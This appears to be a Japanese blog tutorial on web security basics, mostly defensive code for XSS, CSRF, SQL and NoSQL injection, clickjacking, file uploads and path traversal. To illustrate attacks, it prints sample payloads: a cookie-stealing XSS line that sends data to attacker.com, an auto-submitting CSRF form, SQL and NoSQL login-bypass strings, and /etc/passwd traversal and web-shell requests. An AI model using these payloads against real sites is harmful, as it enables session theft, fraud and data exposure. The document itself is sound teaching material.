---
title: 'Webセキュリティの基礎：XSS、CSRF、SQLインジェクション対策ガイド'
description: 'セキュアなWebアプリケーションを構築するために、主要なWebセキュリティの脆弱性と防御戦略をマスターしましょう'
date: '2026-02-23'
tags: ['Web Security', 'XSS', 'CSRF', 'SQL Injection', 'Security']
authors: ['rownix']
draft: false
---

> **要約**: XSS、CSRF、SQLインジェクションなど、主要なセキュリティ脆弱性を詳しく解説します。防御戦略とベストプラクティスを学びましょう。

## OWASP Top 10の概要

```
2021 OWASP Top 10:
┌────┬─────────────────────────────┬─────────────────┐
│ 順位 │ 脆弱性の種類                │ リスクレベル    │
├────┼─────────────────────────────┼─────────────────┤
│ 1  │ アクセス制御の不備          │ 🔴 クリティカル │
│ 2  │ 暗号化の失敗                │ 🔴 クリティカル │
│ 3  │ インジェクション (SQL/NoSQL)│ 🔴 クリティカル │
│ 4  │ 不安全な設計                │ 🟠 高           │
│ 5  │ セキュリティ設定の不備      │ 🟠 高           │
│ 6  │ 脆弱なコンポーネント        │ 🟠 高           │
│ 7  │ 認証の失敗                  │ 🟠 高           │
│ 8  │ データの整合性の不備        │ 🟡 中           │
│ 9  │ ログ記録の不備              │ 🟡 中           │
│ 10 │ SSRF                        │ 🟡 中           │
└────┴─────────────────────────────┴─────────────────┘
```

## XSS (クロスサイトスクリプティング)

### 攻撃の仕組み

```javascript
// 攻撃シナリオ 1: 反射型XSS
// URL: https://example.com/search?q=<script>alert(document.cookie)</script>
// ページがユーザーの入力を直接出力する場合:
document.write(`Search results: ${location.search.split('=')[1]}`)
// 結果: 悪意のあるスクリプトが実行される

// 攻撃シナリオ 2: 格納型XSS
// ユーザーがコメントを投稿:
// コメント: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
// 他のユーザーがこのコメントを表示すると、Cookieが盗まれる

// 攻撃シナリオ 3: DOM型XSS
// ページのコード:
const hash = location.hash.slice(1)
eval(hash) // #alert(1)
```

### 防御策

```javascript
// ❌ 悪い例：HTMLの直接挿入
function displayUserInput(input) {
  document.getElementById('output').innerHTML = input
}

// ✅ 正しいアプローチ 1：textContentを使用
function displayUserInput(input) {
  document.getElementById('output').textContent = input
}

// ✅ 正しいアプローチ 2：HTMLをエスケープ
function escapeHtml(text) {
  const div = document.createElement('div')
  div.textContent = text
  return div.innerHTML
}

// ✅ 正しいアプローチ 3：DOMPurifyライブラリの使用
import DOMPurify from 'dompurify'

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
})
```

### コンテンツセキュリティポリシー (CSP)

```http
# HTTPレスポンスヘッダー
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```javascript
// レポートモード（最初は監視し、後で強制適用する）
Content-Security-Policy-Report-Only: ...; report-uri /csp-report

// 違反の報告を受ける
app.post('/csp-report', (req, res) => {
  console.log('CSP Violation:', req.body)
  // セキュリティログに記録
  securityLogger.warn('CSP Violation', req.body)
})
```

### Cookieのセキュリティ設定

```javascript
// ExpressでのセキュアCookie設定
res.cookie('sessionId', token, {
  httpOnly: true, // JavaScriptからのアクセスを禁止
  secure: true, // HTTPS接続のみ送信
  sameSite: 'strict', // CSRF保護
  maxAge: 3600000, // 1時間の有効期限
  domain: '.example.com',
})

// モダンブラウザ：Cookieのプレフィックス
// __Host-: secure属性を強制、Domain属性なし、Path=/を強制
// __Secure-: secure属性を強制
res.setHeader(
  'Set-Cookie',
  '__Host-sessionId=' + token + '; Path=/; Secure; HttpOnly; SameSite=Strict',
)
```

## CSRF (クロスサイトリクエストフォージェリ)

### 攻撃の仕組み

```html
<!-- 攻撃者のページ (evil.com) -->
<body>
  <!-- ユーザーが bank.com にログインしていると、Cookieが自動的に送信される -->
  <form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="10000" />
  </form>
  <script>
    document.getElementById('csrf').submit()
  </script>
</body>
```

```javascript
// imgタグによる攻撃 (GETリクエスト)
<img src="https://bank.com/delete-account?id=123" width="0" height="0">

// AJAX攻撃 (CORSプリフライトは失敗するが、単純なリクエストは成功する可能性がある)
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // Cookieを含める
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to=attacker&amount=10000'
})
```

### 防御策

```javascript
// ✅ 解決策 1：CSRFトークン
// サーバー側でトークンを生成
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex')
  req.session.csrfToken = csrfToken

  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}">
      <input type="text" name="to" placeholder="Recipient">
      <input type="number" name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `)
})

// トークンの検証
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF Token')
  }
  // 送金処理を実行...
})
```

```javascript
// ✅ 解決策 2：SameSite Cookie属性
// モダンブラウザはデフォルトでサポート
res.cookie('sessionId', token, {
  sameSite: 'strict', // サードパーティCookieを完全にブロック
  // sameSite: 'lax'   // トップレベルナビゲーションのGETリクエストは許可
})

// ✅ 解決策 3：Double Cookieパターン
// サーバーの設定: Set-Cookie: csrfToken=abc123; SameSite=Strict
// Cookieを読み取り、リクエストヘッダーに追加
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken'), // Cookieから読み取る
  },
  body: JSON.stringify(data),
})

// サーバーでの検証
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-csrf-token'] !== req.cookies.csrfToken) {
    return res.status(403).send('Invalid CSRF token')
  }
})
```

```javascript
// ✅ 解決策 4：Origin/Refererヘッダーの検証
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer
  const allowedOrigins = ['https://example.com', 'https://app.example.com']

  if (
    !origin ||
    !allowedOrigins.some((allowed) => origin.startsWith(allowed))
  ) {
    return res.status(403).send('Invalid origin')
  }
  next()
})
```

## SQLインジェクション

### 攻撃の仕組み

```javascript
// ❌ 悪い例：文字列結合によるSQL作成
app.get('/user', async (req, res) => {
  const id = req.query.id
  const sql = `SELECT * FROM users WHERE id = ${id}`
  // 攻撃: ?id=1 OR 1=1 --
  // 結果: SELECT * FROM users WHERE id = 1 OR 1=1 --
  // 全ユーザーの情報が返されてしまう

  const users = await db.query(sql)
  res.json(users)
})

// ❌ 悪い例：ログインのバイパス
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
// 攻撃: username = admin' --
// 結果: SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx'
// パスワード検証を回避して管理者としてログインされる
```

### 防御策

```javascript
// ✅ 解決策 1：パラメータ化クエリ (プリペアドステートメント)
// Node.js + mysql2
const [rows] = await pool.execute(
  'SELECT * FROM users WHERE id = ? AND status = ?',
  [userId, 'active'],
)

// ✅ 解決策 2：ORMフレームワークの使用
// Prisma
const user = await prisma.user.findUnique({
  where: { id: parseInt(userId) },
})

// Sequelize
const user = await User.findByPk(userId)

// ✅ 解決策 3：入力バリデーション
import { z } from 'zod'

const userIdSchema = z.number().int().positive().max(1000000)

app.get('/user/:id', async (req, res) => {
  const result = userIdSchema.safeParse(parseInt(req.params.id))
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid user ID' })
  }
  // 処理を続行...
})
```

### NoSQLインジェクション対策

```javascript
// ❌ MongoDBでのインジェクションリスク
const user = await db.collection('users').findOne({
  username: req.body.username,
  password: req.body.password,
})
// 攻撃: {"username": {"$ne": null}, "password": {"$ne": null}}
// ログインがバイパスされる

// ✅ 正しいアプローチ
import { ObjectId } from 'mongodb'

// ObjectIdを検証
if (!ObjectId.isValid(id)) {
  throw new Error('Invalid ID')
}
const doc = await collection.findOne({ _id: new ObjectId(id) })

// 型を制限したクエリ
const user = await db.collection('users').findOne({
  username: String(req.body.username),
  password: hashPassword(req.body.password), // 必ずハッシュ化する
})
```

## その他の一般的な攻撃

### 1. クリックジャッキング

```javascript
// 攻撃: 透明なiframeに対象サイトを埋め込む
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:100px; left:100px;">Click to claim reward</button>
// ユーザーが「特典を受け取る」ボタンをクリックすると、実際には送金ボタンをクリックしている
```

```http
# 防御: X-Frame-Options
X-Frame-Options: DENY                    # 埋め込みを完全に拒否
X-Frame-Options: SAMEORIGIN              # 同一オリジンのみ埋め込みを許可

# または CSP を使用
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

### 2. ファイルアップロードの脆弱性

```javascript
// ❌ 危険：ユーザー指定のファイル名で直接保存
app.post('/upload', upload.single('file'), (req, res) => {
  fs.writeFileSync(`./uploads/${req.file.originalname}`, req.file.buffer)
  // 攻撃者が shell.php をアップロード
  // アクセス先: /uploads/shell.php?cmd=cat /etc/passwd
})

// ✅ 安全なアプローチ
import path from 'path'
import crypto from 'crypto'
import { fileTypeFromBuffer } from 'file-type'

app.post('/upload', async (req, res) => {
  // 1. ファイルタイプを検証（ファイル名ではなくバッファから判断）
  const fileType = await fileTypeFromBuffer(req.file.buffer)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp']

  if (!allowedTypes.includes(fileType?.mime)) {
    return res.status(400).send('Unsupported file type')
  }

  // 2. ファイル名を変更（元のファイル名は使用しない）
  const ext = path.extname(req.file.originalname)
  const filename = crypto.randomUUID() + ext

  // 3. Web公開ディレクトリ外に保存
  await fs.writeFile(`./private-uploads/${filename}`, req.file.buffer)

  // 4. パスの代わりにファイルIDを返す
  res.json({ fileId: filename })
})

// 画像へはプロキシ経由でアクセスし、透かしや権限チェックを追加
app.get('/image/:id', authenticate, async (req, res) => {
  const filePath = `./private-uploads/${req.params.id}`
  // ファイルの存在確認、ユーザー権限の検証...
  res.sendFile(filePath)
})
```

### 3. パストラバーサル

```javascript
// ❌ 危険なコード
const filePath = `./files/${req.query.filename}`
// 攻撃: ?filename=../../../etc/passwd
// 結果: ./files/../../../etc/passwd → /etc/passwd が読み取られる

// ✅ 安全なアプローチ
import path from 'path'

const BASE_DIR = path.resolve('./files')
const requestedPath = path.resolve(BASE_DIR, req.query.filename)

// ベースディレクトリ内に収まっているか確認
if (!requestedPath.startsWith(BASE_DIR)) {
  return res.status(403).send('Invalid path')
}

// またはホワイトリストを使用
const allowedFiles = ['report.pdf', 'data.csv', 'readme.txt']
if (!allowedFiles.includes(req.query.filename)) {
  return res.status(403).send('File not found')
}
```

## セキュリティ開発のベストプラクティス

### 1. 依存関係のセキュリティチェック

```bash
# 既知の脆弱性をチェック
npm audit
npm audit fix

# または Snyk を使用
npx snyk test
npx snyk monitor

# pre-commitチェックに追加
# .husky/pre-commit
npm audit --audit-level=moderate
```

### 2. セキュリティヘッダー用ミドルウェア

```javascript
// Express + helmet
import helmet from 'helmet'

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", 'data:', 'https:'],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  }),
)

// 重要なヘッダーを手動で設定
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('X-Frame-Options', 'DENY')
  res.setHeader('X-XSS-Protection', '1; mode=block')
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=()',
  )
  next()
})
```

### 3. 入力バリデーションと出力エンコーディング

```javascript
// Zodを使用した厳格なバリデーション
import { z } from 'zod'

const userSchema = z.object({
  username: z
    .string()
    .min(3)
    .max(20)
    .regex(/^[a-zA-Z0-9_]+$/),
  email: z.string().email(),
  age: z.number().int().min(0).max(150),
  role: z.enum(['user', 'admin']),
})

app.post('/register', async (req, res) => {
  const result = userSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({
      error: 'Input validation failed',
      details: result.error.issues,
    })
  }

  // バリデーション済みのデータを使用
  const user = await createUser(result.data)
  res.json(user)
})
```

### 4. エラーハンドリング

```javascript
// ❌ 危険：機密情報を漏洩させる
app.get('/user/:id', async (req, res) => {
  try {
    const user = await db.query(
      `SELECT * FROM users WHERE id = ${req.params.id}`,
    )
    res.json(user)
  } catch (error) {
    // データベース構造を漏らしてしまう
    res.status(500).send(error.message) // "Table 'users' doesn't exist"
  }
})

// ✅ 安全なアプローチ
app.use((err, req, res, next) => {
  // 詳細なエラーをログに記録
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    user: req.user?.id,
  })

  // ユーザーには一般的なエラーを返す
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id, // ログの紐付け用ID
  })
})
```

## セキュリティテストツール

```bash
# 1. 依存関係の脆弱性スキャン
npm audit
snyk test

# 2. 静的コード解析 (SAST)
eslint-plugin-security
semgrep

# 3. 動的テスト (DAST)
# OWASP ZAP
zap-baseline.py -t https://example.com

# 4. ペネトレーションテストツール
# Burp Suite, sqlmap, nmap

# 5. コンテナセキュリティスキャン
trivy image myapp:latest
```

---

**開発中にどのようなセキュリティ問題に直面したことがありますか？ぜひ皆さんの経験をコメントで共有してください。** 👇
